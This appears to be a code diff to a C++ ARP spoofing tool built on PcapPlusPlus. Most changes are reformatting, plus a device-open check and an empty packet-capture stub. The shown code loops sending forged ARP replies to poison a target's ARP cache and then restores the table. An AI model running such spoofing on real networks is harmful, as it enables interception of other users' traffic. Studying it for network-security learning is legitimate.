@@ -13,22 +13,22 @@
 #include <cstdlib>
 #include <getopt.h>
 #include <iostream>
+#include <thread>
 #include <unistd.h>
 
 static volatile sig_atomic_t g_shutdown_requested = 0;
 
 void create_arp_packet() { pcpp::Packet arpRequest(500); }
 
-
 void handle_signal(int signum) {
-    std::cout << "Send " << signum <<std::endl;
-    g_shutdown_requested = 1;
+  std::cout << "Send " << signum << std::endl;
+  g_shutdown_requested = 1;
 }
 
+void capturePacket(pcpp::IPv4Address IpInterface) {}
 void restoreARP(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
                 pcpp::MacAddress &mac_src, pcpp::IPv4Address &ipv4_target,
                 pcpp::MacAddress &mac_target) {
-
 
   std::cout << "Restore ARP table" << std::endl;
 
@@ -36,7 +36,8 @@ void restoreARP(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
   pcpp::Packet targetARPReply(500);
   pcpp::EthLayer targetEthLayer(pDevice->getMacAddress(), mac_target,
                                 static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
-  pcpp::ArpLayer targetArplayer(pcpp::ArpReply(mac_src, ipv4_src, mac_target, ipv4_target));
+  pcpp::ArpLayer targetArplayer(
+      pcpp::ArpReply(mac_src, ipv4_src, mac_target, ipv4_target));
   targetARPReply.addLayer(&targetEthLayer);
   targetARPReply.addLayer(&targetArplayer);
   targetARPReply.computeCalculateFields();
@@ -80,7 +81,7 @@ void arpspoofing(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
   sourceARPReply.addLayer(&sourceEthLayer);
   sourceARPReply.addLayer(&sourceARPLayer);
   sourceARPLayer.computeCalculateFields();
-  
+
   while (!g_shutdown_requested) {
     pDevice->sendPacket(&targetARPReply);
     std::cout << "Sent ARP reply: " << ipv4_target
@@ -93,7 +94,6 @@ void arpspoofing(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
     std::this_thread::sleep_for(std::chrono::seconds(5));
   }
   restoreARP(pDevice, ipv4_src, mac_src, ipv4_target, mac_target);
-  
 }
 int main(int argc, char **argv) {
 
@@ -176,9 +176,14 @@ int main(int argc, char **argv) {
   sa.sa_handler = handle_signal;
 
   if (sigaction(SIGINT, &sa, nullptr) == -1) {
-        std::perror("sigaction(SIGINT) failed");
-        return 1;
-    }
+    std::perror("sigaction(SIGINT) failed");
+    return 1;
+  }
+
+  if (!pIfaceDevice->open()) {
+    std::cerr << "Cannot open device" << std::endl;
+    return 1;
+  }
 
   arpspoofing(pIfaceDevice, IPv4_source, MAC_source, IPv4_target, MAC_target);
 }
